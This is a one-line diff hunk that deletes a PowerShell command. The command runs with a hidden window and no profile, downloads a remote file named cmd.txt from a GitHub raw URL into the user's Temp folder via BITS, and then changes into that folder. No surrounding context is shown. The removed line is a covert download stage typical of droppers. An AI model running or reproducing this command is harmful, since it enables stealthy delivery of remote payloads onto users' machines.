@@ -1,1 +1,0 @@
-powershell -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/ShilpeshTrivedi/SakalaBoobBoon/master/cmd.txt -Destination "C:\Users\$env:UserName\AppData\Local\Temp\cmd.txt";Set-Location -Path "C:\Users\$env:UserName\AppData\Local\Temp\";
